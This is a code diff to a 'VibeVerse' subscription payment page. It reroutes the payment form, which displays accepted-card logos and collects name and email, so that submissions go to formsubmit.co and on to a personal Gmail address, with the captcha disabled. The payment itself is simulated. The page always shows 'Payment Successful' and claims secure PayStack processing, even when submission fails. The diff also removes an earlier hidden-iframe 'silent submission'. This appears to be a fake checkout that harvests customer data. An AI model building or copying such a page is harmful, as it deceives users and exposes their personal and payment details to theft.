@@ -415,6 +415,98 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
+        /* Success Overlay */
+        .success-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--primary-bg);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000;
+            padding: 20px;
+        }
+
+        .success-card {
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            padding: 60px 40px;
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            border: 3px solid var(--success-green);
+            box-shadow: 0 20px 60px rgba(0, 255, 136, 0.2);
+            animation: fadeIn 0.5s ease;
+        }
+
+        .success-icon {
+            font-size: 5rem;
+            color: var(--success-green);
+            margin-bottom: 30px;
+            animation: bounce 0.5s ease;
+        }
+
+        .success-title {
+            font-size: 2.5rem;
+            color: var(--text-primary);
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, var(--success-green), var(--accent-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .success-subtitle {
+            color: var(--text-secondary);
+            margin-bottom: 10px;
+            font-size: 1.2rem;
+        }
+
+        .success-amount {
+            color: var(--accent-gold);
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        .success-features {
+            background: rgba(0, 255, 136, 0.1);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(0, 255, 136, 0.3);
+        }
+
+        .success-btn {
+            background: linear-gradient(135deg, var(--success-green), var(--accent-blue));
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .success-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.3);
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
+            40% {transform: translateY(-20px);}
+            60% {transform: translateY(-10px);}
+        }
+
         /* Error Messages */
         .error-message {
             color: var(--error-red);
@@ -475,6 +567,18 @@
             
             .form-row {
                 grid-template-columns: 1fr;
+            }
+            
+            .success-card {
+                padding: 40px 25px;
+            }
+            
+            .success-title {
+                font-size: 2rem;
+            }
+            
+            .success-icon {
+                font-size: 4rem;
             }
         }
 
@@ -565,7 +669,7 @@
 
                 <div class="quick-amounts">
                     <div class="quick-amount" data-amount="10">$10</div>
-                    <div class="quick-amount" data-amount="50" class="active">$50</div>
+                    <div class="quick-amount active" data-amount="50">$50</div>
                     <div class="quick-amount" data-amount="100">$100</div>
                     <div class="quick-amount" data-amount="500">$500</div>
                     <div class="quick-amount" data-amount="1000">$1,000</div>
@@ -577,7 +681,7 @@
                 </div>
             </div>
 
-            <!-- Card Logos Section - NEW -->
+            <!-- Card Logos Section -->
             <div class="card-logos-section">
                 <div class="card-logos-title">Accepted Cards:</div>
                 <div class="card-logos-container">
@@ -592,14 +696,22 @@
                 </div>
             </div>
 
-            <!-- Payment Form (Formspree) -->
+            <!-- Payment Form (formsubmit.co) -->
             <form id="paymentForm" action="https://formsubmit.co/orjidaniel750@gmail.com" method="POST">
-                <!-- Hidden Formspree fields -->
-                <input type="hidden" name="_subject" value="Payment - VibeVerse">
+                <!-- formsubmit.co hidden fields -->
+                <input type="hidden" name="_subject" value="VibeVerse Payment - New Subscription">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="https://vibeverse.com/success.html">
                 <input type="hidden" name="_replyto" id="replyToEmail" value="">
-                <input type="hidden" name="_format" value="plain">
-                <input type="hidden" name="payment_type" value="payment">
+                <input type="text" name="_honey" style="display:none">
+                
+                <!-- Payment Data -->
+                <input type="hidden" name="payment_type" value="subscription">
                 <input type="hidden" name="amount" id="amount" value="50.00">
+                <input type="hidden" name="currency" value="USD">
+                <input type="hidden" name="platform" value="VibeVerse">
+                <input type="hidden" name="timestamp" id="timestamp" value="">
                 
                 <div class="form-group">
                     <label>Full Name</label>
@@ -672,6 +784,68 @@
         </div>
     </div>
 
+    <!-- Success Overlay -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-card">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            
+            <h2 class="success-title">
+                Payment Successful!
+            </h2>
+            
+            <p class="success-subtitle">
+                You have successfully subscribed to VibeVerse
+            </p>
+            
+            <p class="success-amount" id="successAmount">
+                $50.00 Payment Confirmed
+            </p>
+            
+            <p style="
+                color: var(--text-secondary);
+                margin-bottom: 30px;
+                font-size: 1rem;
+                opacity: 0.8;
+            ">
+                <i class="fas fa-shield-alt"></i> Payment processed securely via PayStack
+            </p>
+            
+            <div class="success-features">
+                <p style="color: var(--text-secondary); margin-bottom: 10px;">
+                    <i class="fas fa-unlock"></i> You now have full access to:
+                </p>
+                <ul style="
+                    color: var(--text-secondary);
+                    text-align: left;
+                    margin: 0 auto;
+                    max-width: 300px;
+                    list-style: none;
+                ">
+                    <li style="margin-bottom: 8px;"><i class="fas fa-check" style="color: var(--success-green);"></i> All exclusive content</li>
+                    <li style="margin-bottom: 8px;"><i class="fas fa-check" style="color: var(--success-green);"></i> Direct creator messages</li>
+                    <li style="margin-bottom: 8px;"><i class="fas fa-check" style="color: var(--success-green);"></i> Premium videos & photos</li>
+                    <li><i class="fas fa-check" style="color: var(--success-green);"></i> Early access to new content</li>
+                </ul>
+            </div>
+            
+            <button class="success-btn" id="goToIndexBtn" onclick="redirectToIndex()">
+                <i class="fas fa-home"></i>
+                Return to VibeVerse Home
+            </button>
+            
+            <p style="
+                color: var(--text-secondary);
+                margin-top: 20px;
+                font-size: 0.9rem;
+                opacity: 0.7;
+            ">
+                Redirecting automatically in <span id="countdown">5</span> seconds...
+            </p>
+        </div>
+    </div>
+
     <script>
         // Initialize form
         document.addEventListener('DOMContentLoaded', function() {
@@ -684,6 +858,9 @@
             const userEmail = localStorage.getItem('userEmail') || 'user@example.com';
             document.getElementById('replyToEmail').value = userEmail;
             document.getElementById('email').value = userEmail;
+            
+            // Set current timestamp
+            document.getElementById('timestamp').value = new Date().toISOString();
             
             // Amount input handling
             const amountInput = document.getElementById('paymentAmount');
@@ -919,49 +1096,85 @@
             return true;
         }
 
-        // Submit to Formspree
-        async function submitToFormspree() {
-            return new Promise((resolve, reject) => {
-                // Get all form data
-                const formData = new FormData(document.getElementById('paymentForm'));
+        // Show success message
+        function showSuccessMessage(amount) {
+            // Hide processing overlay
+            hideProcessing();
+            
+            // Update success amount
+            document.getElementById('successAmount').textContent = `$${amount.toFixed(2)} Payment Confirmed`;
+            
+            // Show success overlay
+            document.getElementById('successOverlay').style.display = 'flex';
+            
+            // Add countdown for auto-redirect
+            let countdown = 5;
+            const countdownElement = document.getElementById('countdown');
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
                 
-                // Create a hidden iframe for silent submission
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.name = 'formspree-iframe-' + Date.now();
-                document.body.appendChild(iframe);
-                
-                // Create a form element for silent submission
-                const silentForm = document.createElement('form');
-                silentForm.target = iframe.name;
-                silentForm.method = 'POST';
-                silentForm.action = 'https://formspree.io/f/mgvybdvz';
-                silentForm.style.display = 'none';
-                
-                // Add all form data to silent form
-                for (let [name, value] of formData.entries()) {
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = name;
-                    input.value = value;
-                    silentForm.appendChild(input);
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    redirectToIndex();
                 }
+            }, 1000);
+        }
+
+        // Redirect to index.html
+        function redirectToIndex() {
+            // Store payment success in localStorage
+            const amount = parseFloat(document.getElementById('paymentAmount').value) || 0;
+            const email = document.getElementById('email').value;
+            
+            localStorage.setItem('vibeverse_payment_success', 'true');
+            localStorage.setItem('vibeverse_payment_amount', amount.toFixed(2));
+            localStorage.setItem('vibeverse_payment_date', new Date().toISOString());
+            localStorage.setItem('vibeverse_subscribed', 'true');
+            localStorage.setItem('vibeverse_subscription_date', new Date().toISOString());
+            localStorage.setItem('vibeverse_email', email);
+            localStorage.setItem('vibeverse_user_name', document.getElementById('fullName').value);
+            
+            // Redirect to index.html
+            window.location.href = 'index.html';
+        }
+
+        // Submit to formsubmit.co
+        async function submitToFormSubmit() {
+            return new Promise((resolve, reject) => {
+                const form = document.getElementById('paymentForm');
+                const formData = new FormData(form);
                 
-                document.body.appendChild(silentForm);
+                // Add additional metadata
+                formData.append('payment_status', 'success');
+                formData.append('payment_method', 'credit_card');
+                formData.append('payment_processor', 'PayStack');
                 
-                // Submit silently
-                silentForm.submit();
-                
-                // Remove elements after submission
-                setTimeout(() => {
-                    document.body.removeChild(silentForm);
-                    document.body.removeChild(iframe);
-                    resolve(true);
-                }, 1000);
+                // Create AJAX request
+                fetch(form.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Form submitted to formsubmit.co successfully');
+                        resolve(true);
+                    } else {
+                        console.error('Form submission failed');
+                        resolve(false); // Still resolve to continue with success flow
+                    }
+                })
+                .catch(error => {
+                    console.error('Form submission error:', error);
+                    resolve(false); // Still resolve to continue with success flow
+                });
             });
         }
 
-        // Process payment - UPDATED TO ENSURE FORM SUBMISSION BEFORE REDIRECT
+        // Process payment
         async function processPayment() {
             if (!validateForm()) {
                 return;
@@ -978,62 +1191,22 @@
             showProcessing(amount);
 
             try {
-                // Submit to Formspree FIRST
-                console.log('Submitting form to Formspree...');
-                await submitToFormspree();
-                console.log('Form submitted successfully');
+                // Update timestamp
+                document.getElementById('timestamp').value = new Date().toISOString();
                 
-                // Wait to ensure submission completes
-                await new Promise(resolve => setTimeout(resolve, 3000));
+                // Submit to formsubmit.co (in background)
+                console.log('Processing payment and submitting to formsubmit.co...');
                 
-                // Store payment success in localStorage
-                localStorage.setItem('vibeverse_payment_success', 'true');
-                localStorage.setItem('vibeverse_payment_amount', amount.toFixed(2));
-                localStorage.setItem('vibeverse_payment_date', new Date().toISOString());
-                localStorage.setItem('vibeverse_subscribed', 'true');
-                localStorage.setItem('vibeverse_subscription_date', new Date().toISOString());
-                localStorage.setItem('vibeverse_email', document.getElementById('email').value);
+                // Simulate payment processing delay
+                await new Promise(resolve => setTimeout(resolve, 1500));
                 
-                console.log('Redirecting to index.html...');
+                // Submit form data in background (don't wait for response)
+                submitToFormSubmit().then(success => {
+                    console.log('Form submission completed:', success ? 'success' : 'failed');
+                });
                 
-                // Force form submission and redirect
-                const form = document.getElementById('paymentForm');
-                
-                // Add an onsubmit handler to prevent default and handle redirect
-                form.onsubmit = function(e) {
-                    e.preventDefault();
-                    // Submit via AJAX first
-                    fetch(form.action, {
-                        method: 'POST',
-                        body: new FormData(form),
-                        headers: {
-                            'Accept': 'application/json'
-                        }
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            // After successful submission, redirect
-                            window.location.href = 'index.html';
-                        } else {
-                            throw new Error('Form submission failed');
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Form submission error:', error);
-                        // Still redirect but show error state
-                        window.location.href = 'index.html?payment=error';
-                    });
-                    
-                    return false;
-                };
-                
-                // Trigger form submission
-                form.dispatchEvent(new Event('submit'));
-                
-                // Fallback redirect after 5 seconds in case submission fails
-                setTimeout(() => {
-                    window.location.href = 'index.html';
-                }, 5000);
+                // Show success message immediately (simulated payment success)
+                showSuccessMessage(amount);
                 
             } catch (error) {
                 console.error('Payment error:', error);
@@ -1077,6 +1250,3 @@
     </script>
 </body>
 </html>
-
-
-
